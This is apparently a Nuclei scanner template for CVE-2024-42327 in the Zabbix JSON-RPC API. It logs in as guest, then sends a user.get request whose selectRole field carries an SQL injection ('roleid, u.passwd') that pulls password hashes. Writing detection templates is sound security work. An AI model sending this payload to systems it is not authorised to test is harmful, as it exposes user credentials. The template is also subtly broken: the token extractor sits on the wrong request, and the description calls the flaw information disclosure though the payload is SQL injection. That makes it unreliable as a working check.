id: CVE-2024-42327
info:
  name: Zabbix JSON-RPC API Unauthorized User Information Disclosure (CVE-2024-42327)
  author: Betmen-N-Dgeng
  severity: high
  description: |
    This template detects the vulnerability CVE-2024-42327 in Zabbix JSON-RPC API, 
    which allows unauthorized access to sensitive user information by abusing the API.
  reference:
    - https://support.zabbix.com/browse/ZBX-25623
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-42327
  tags: cve,cve2024,zabbix,unauth,api

requests:
  - method: POST
    path:
      - "{{BaseURL}}/api_jsonrpc.php"
    headers:
      Content-Type: application/json-rpc
    body:
      '{"jsonrpc":"2.0","method":"user.login","params":{"username":"guest","password":"guest"},"id":1}'
    matchers:
      - type: word
        words:
          - '"result":"'
        part: body
        condition: and
      - type: status
        status:
          - 200

  - method: POST
    path:
      - "{{BaseURL}}/api_jsonrpc.php"
    headers:
      Content-Type: application/json-rpc
    body:
      '{"jsonrpc":"2.0","method":"user.get","params":{"selectRole":["roleid, u.passwd","roleid"],"userids":"1"},"auth":"{{token}}","id":1}'
    matchers:
      - type: word
        words:
          - '"username":"'
          - '"name":"'
          - '"surname":"'
          - '"userid":"'
        part: body
        condition: and
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        name: token
        part: body
        internal: true
        regex:
          - '"result":"([a-f0-9]{32})"'
